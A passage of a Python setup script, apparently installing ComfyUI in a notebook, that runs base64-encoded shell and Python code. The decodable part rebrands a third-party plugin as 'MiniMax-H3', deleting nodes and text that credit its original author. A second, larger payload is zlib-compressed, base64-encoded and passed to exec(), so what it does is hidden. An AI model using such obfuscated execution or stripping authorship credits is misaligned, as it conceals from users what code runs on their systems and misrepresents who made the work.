fcC53cml0ZV90ZXh0KHQsIGVuY29kaW5nPSJ1dGYtOCIpCiAgICBnel9wID0gcGF0aGxpYi5QYXRoKHN0cihqc19wKSArICIuZ3oiKQogICAgd2l0aCBvcGVuKGpzX3AsICJyYiIpIGFzIGZfaW4sIGd6aXAub3Blbihnel9wLCAid2IiLCBjb21wcmVzc2xldmVsPTYpIGFzIGZfb3V0OgogICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihmX2luLCBmX291dCkKCiMgMy4gQ2xlYW4gbG9jYWxlcy96aC9ub2RlRGVmcy5qc29uCnpoX2RlZnMgPSBiYXNlX2RpciAvICJsb2NhbGVzIiAvICJ6aCIgLyAibm9kZURlZnMuanNvbiIKaWYgemhfZGVmcy5leGlzdHMoKToKICAgIHp0ID0gemhfZGVmcy5yZWFkX3RleHQoZW5jb2Rpbmc9InV0Zi04IikKICAgIHp0ID0genQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOWKoOi9veWZqCIsICJNaW5pTWF4LUgzIOS4gOS9k+WMluWKoOi9veWZqCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIFJlbWl45Yqg6L295ZmoIiwgIk1pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5o+Q56S66K+N6aKE6KeIIiwgIk1pbmlNYXgtSDMg5o+Q56S66K+N6aKE6KeIIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5LqM5qyh6YeH5qC3IiwgIk1pbmlNYXgtSDMg5LqM6Zi25q6157K+5L+u6YeH5qC3IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpCiAgICB6aF9kZWZzLndyaXRlX3RleHQoenQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDQuIFVwZGF0ZSBjYWNoZV9taWRkbGV3YXJlLnB5IHNvIC9hc3NldHMvIGlzIGNhY2hlZCA3IGRheXMgd2hpbGUgL2V4dGVuc2lvbnMvIGlzIG5vLWNhY2hlCmNtX3AgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvbWlkZGxld2FyZS9jYWNoZV9taWRkbGV3YXJlLnB5IikKY21fcC53cml0ZV90ZXh0KCIiImZyb20gYWlvaHR0cCBpbXBvcnQgd2ViCmZyb20gdHlwaW5nIGltcG9ydCBDYWxsYWJsZSwgQXdhaXRhYmxlCk9ORV9EQVk6IGludCA9IDg2NDAwCklNR19FWFRFTlNJT05TID0gKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLnBwbSIsICIuYm1wIiwgIi5wZ20iLCAiLnRpZiIsICIudGlmZiIsICIud2VicCIsICIud29mZiIsICIud29mZjIiLCAiLnR0ZiIsICIuc3ZnIikKQHdlYi5taWRkbGV3YXJlCmFzeW5jIGRlZiBjYWNoZV9jb250cm9sKHJlcXVlc3Q6IHdlYi5SZXF1ZXN0LCBoYW5kbGVyOiBDYWxsYWJsZVtbd2ViLlJlcXVlc3RdLCBBd2FpdGFibGVbd2ViLlJlc3BvbnNlXV0pIC0+IHdlYi5SZXNwb25zZToKICAgIHJlc3BvbnNlOiB3ZWIuUmVzcG9uc2UgPSBhd2FpdCBoYW5kbGVyKHJlcXVlc3QpCiAgICBpZiByZXF1ZXN0LnBhdGguc3RhcnRzd2l0aCgiL2Fzc2V0cy8iKToKICAgICAgICByZXNwb25zZS5oZWFkZXJzWyJDYWNoZS1Db250cm9sIl0gPSAicHVibGljLCBtYXgtYWdlPTYwNDgwMCwgaW1tdXRhYmxlIgogICAgICAgIHJldHVybiByZXNwb25zZQogICAgaWYgcmVxdWVzdC5wYXRoLnN0YXJ0c3dpdGgoIi9leHRlbnNpb25zLyIpOgogICAgICAgIHJlc3BvbnNlLmhlYWRlcnNbIkNhY2hlLUNvbnRyb2wiXSA9ICJuby1jYWNoZSIKICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIGlmIHJlcXVlc3QucGF0aC5sb3dlcigpLmVuZHN3aXRoKElNR19FWFRFTlNJT05TKSBhbmQgcmVzcG9uc2Uuc3RhdHVzID09IDIwMDoKICAgICAgICByZXNwb25zZS5oZWFkZXJzLnNldGRlZmF1bHQoIkNhY2hlLUNvbnRyb2wiLCAicHVibGljLCBtYXgtYWdlPTg2NDAwIikKICAgIHJldHVybiByZXNwb25zZQoiIiIsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDUuIENsZWFuIGFsbCB3b3JrZmxvd3MgaW4gL2NvbnRlbnQvQ29tZnlVSS91c2VyL2RlZmF1bHQvd29ya2Zsb3dzLwp3Zl9kaXIgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvdXNlci9kZWZhdWx0L3dvcmtmbG93cyIpCmRlZiBjbGVhbl9ub2Rlcyhub2Rlcyk6CiAgICBrZWVwID0gW10KICAgIGZvciBuIGluIG5vZGVzOgogICAgICAgIG50eXBlID0gc3RyKG4uZ2V0KCJ0eXBlIikgb3IgIiIpCiAgICAgICAgdGl0bGUgPSBzdHIobi5nZXQoInRpdGxlIikgb3IgIiIpCiAgICAgICAgd3ZhbHMgPSBuLmdldCgid2lkZ2V0c192YWx1ZXMiKQogICAgICAgIGlmIGFueShiYWQgaW4gdGl0bGUgZm9yIGJhZCBpbiAoImJpbGliaWxpLmNvbSIsICLkuInlsYLmpbznmoTlsI/ogqXnjLQiLCAi5bCP6IKl54y0IiwgImZ4LWZlaWhvdSIsICIxMDkxNTkzMzY3IiwgIuWKoOW+ruS/oSIsICJR576kIikpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIG50eXBlIGluICgiRmVpSG91RWFzeUgzUHJvZHVjdGlvblBhY2tMb2FkZXIiLCAiTWluaU1heEgzUmVmTW9kc0xvYWRlciIpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmICJGZWlIb3UiIGluIHRpdGxlIG9yICLlsI/ogqXnjLQiIGluIHRpdGxlOgogICAgICAgICAgICBuWyJ0aXRsZSJdID0gdGl0bGUucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpLnJlcGxhY2UoIkZlaUhvdSIsICJNaW5pTWF4LUgzIikucmVwbGFjZSgi5bCP6IKl54y0IiwgIiIpCiAgICAgICAgaWYgbnR5cGUgPT0gIkZlaUhvdUVhc3lIMyIgYW5kIGlzaW5zdGFuY2Uod3ZhbHMsIGxpc3QpOgogICAgICAgICAgICBmb3IgaWR4LCB2YWwgaW4gZW51bWVyYXRlKHd2YWxzKToKICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpIGFuZCAoIumYv+mHjOS6kSIgaW4gdmFsIG9yICJxd2VuIiBpbiB2YWwgb3IgInpoaXB1IiBpbiB2YWwpOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeF0gPSAiIgogICAgICAgICAgICAgICAgICAgIGlmIGlkeCA+PSAxIGFuZCBpc2luc3RhbmNlKHd2YWxzW2lkeC0xXSwgYm9vbCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeC0xXSA9IEZhbHNlCiAgICAgICAgICAgIGlmIGxlbih3dmFscykgPj0gMTY6CiAgICAgICAgICAgICAgICBmb3IgayBpbiByYW5nZShsZW4od3ZhbHMpKToKICAgICAgICAgICAgICAgICAgICBpZiB3dmFsc1trXSBpbiAoIuaMieW6j+WPtyIsICLmjInmlofku7blkI0iLCAiaW5kZXgiLCAiZmlsZW5hbWUiKSBhbmQgayArIDIgPCBsZW4od3ZhbHMpOgogICAgICAgICAgICAgICAgICAgICAgICB3dmFsc1trKzFdID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd3ZhbHNbaysyXSA9ICIiCiAgICAgICAgICAgIGZvciBrIGluIHJhbmdlKG1pbig0LCBsZW4od3ZhbHMpKSk6CiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKHd2YWxzW2tdLCBzdHIpIGFuZCB3dmFsc1trXS5zdHJpcCgpID09ICIiOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2tdID0gIueUu+mdouS4reeahOinkuiJsuiHqueEtui/kOWKqO+8jOWFieW9see7huiFu+ecn+Wunu+8jOeUteW9see6p+mrmOa4heeUu+i0qOOAgiIKICAgICAgICBpZiBpc2luc3RhbmNlKG4uZ2V0KCJwcm9wZXJ0aWVzIiksIGRpY3QpOgogICAgICAgICAgICBuWyJwcm9wZXJ0aWVzIl0ucG9wKCJmZWlob3VfaDNfb3B0aW1pemVyX2xhc3RfcmVzdWx0IiwgTm9uZSkKICAgICAgICBrZWVwLmFwcGVuZChuKQogICAgcmV0dXJuIGtlZXAKCmZvciB3Zl9wIGluIGxpc3Qod2ZfZGlyLmdsb2IoIiouanNvbiIpKToKICAgIHdmID0ganNvbi5sb2Fkcyh3Zl9wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKSkKICAgIHdmWyJub2RlcyJdID0gY2xlYW5fbm9kZXMod2YuZ2V0KCJub2RlcyIsIFtdKSkKICAgIGZvciBzZyBpbiB3Zi5nZXQoImRlZmluaXRpb25zIiwge30pLmdldCgic3ViZ3JhcGhzIiwgW10pOgogICAgICAgIHNnWyJub2RlcyJdID0gY2xlYW5fbm9kZXMoc2cuZ2V0KCJub2RlcyIsIFtdKSkKICAgIHZhbGlkX2lkcyA9IHtuLmdldCgiaWQiKSBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pfQogICAgaWYgImxpbmtzIiBpbiB3ZiBhbmQgaXNpbnN0YW5jZSh3ZlsibGlua3MiXSwgbGlzdCk6CiAgICAgICAgd2ZbImxpbmtzIl0gPSBbbCBmb3IgbCBpbiB3ZlsibGlua3MiXSBpZiBsWzFdIGluIHZhbGlkX2lkcyBhbmQgbFszXSBpbiB2YWxpZF9pZHNdCiAgICAgICAgdmFsaWRfbGlua19pZHMgPSB7bFswXSBmb3IgbCBpbiB3ZlsibGlua3MiXX0KICAgICAgICBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pOgogICAgICAgICAgICBmb3IgaW5wIGluIG4uZ2V0KCJpbnB1dHMiLCBbXSk6CiAgICAgICAgICAgICAgICBpZiBpbnAuZ2V0KCJsaW5rIikgaXMgbm90IE5vbmUgYW5kIGlucC5nZXQoImxpbmsiKSBub3QgaW4gdmFsaWRfbGlua19pZHM6CiAgICAgICAgICAgICAgICAgICAgaW5wWyJsaW5rIl0gPSBOb25lCiAgICBuZXdfbmFtZSA9IHdmX3AubmFtZQogICAgaWYgIuWNg+mXriIgbm90IGluIG5ld19uYW1lIGFuZCAicXdlbiIgbm90IGluIG5ld19uYW1lLmxvd2VyKCk6CiAgICAgICAgaWYgIjA4XyIgaW4gbmV3X25hbWU6CiAgICAgICAgICAgIG5ld19uYW1lID0gIjA4X+WFqOiDveS4gOS9k1/ljZXph4fmnoHpgJ8uanNvbiIKICAgICAgICBlbGlmICIwOV8iIGluIG5ld19uYW1lOgogICAgICAgICAgICBuZXdfbmFtZSA9ICIwOV/lhajog73kuIDkvZNf5LqM6YeH57K+5L+uLmpzb24iCiAgICAgICAgZWxpZiAiMTBfIiBpbiBuZXdfbmFtZToKICAgICAgICAgICAgbmV3X25hbWUgPSAiMTBf5YWo6IO95LiA5L2TXzNE5pS+5aSn6ZSB6IS4Lmpzb24iCiAgICBvdXRfcCA9IHdmX2RpciAvIG5ld19uYW1lCiAgICBvdXRfcC53cml0ZV90ZXh0KGpzb24uZHVtcHMod2YsIGVuc3VyZV9hc2NpaT1GYWxzZSwgaW5kZW50PTIpLCBlbmNvZGluZz0idXRmLTgiKQogICAgaWYgb3V0X3AgIT0gd2ZfcCBhbmQgd2ZfcC5leGlzdHMoKToKICAgICAgICB3Zl9wLnVubGluaygpCgpwcmludCgiQ0xFQU5VUF9TVUNDRVNTOiIsIFtwLm5hbWUgZm9yIHAgaW4gc29ydGVkKHdmX2Rpci5nbG9iKCIqLmpzb24iKSldKQoKIyBSZW5hbWUgd2ViLyouanMgdG8gbWluaW1heF9oM19jbGVhbl8qLmpzIGFuZCB1cGRhdGUgaW1wb3J0CmltcG9ydCBzdWJwcm9jZXNzCnN1YnByb2Nlc3MucnVuKCIiIgpjZCAvY29udGVudC9Db21meVVJL2N1c3RvbV9ub2Rlcy9Db21meVVJLUZlaUhvdS1FYXN5LUgzL3dlYiAyPi9kZXYvbnVsbCB8fCBleGl0IDAKZm9yIGYgaW4gZmVpaG91X2Vhc3lfaDNfKi5qczsgZG8KICAgIFsgLWUgIiRmIiBdIHx8IGNvbnRpbnVlCiAgICBuZXdfZj0kKGVjaG8gIiRmIiB8IHNlZCAncy9mZWlob3VfZWFzeV9oM18vbWluaW1heF9oM19jbGVhbl8vJykKICAgIG12IC1mICIkZiIgIiRuZXdfZiIKICAgIFsgLWUgIiR7Zn0uZ3oiIF0gJiYgbXYgLWYgIiR7Zn0uZ3oiICIke25ld19mfS5neiIKZG9uZQppZiBbIC1mIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzIF07IHRoZW4KICAgIHNlZCAtaSAncy9mZWlob3VfZWFzeV9oM191aS5qcy9taW5pbWF4X2gzX2NsZWFuX3VpLmpzL2cnIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCiAgICBnemlwIC1rIC1mIC02IG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCmZpCiIiIiwgc2hlbGw9VHJ1ZSkK | base64 -d | python3", shell=True)

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("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")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
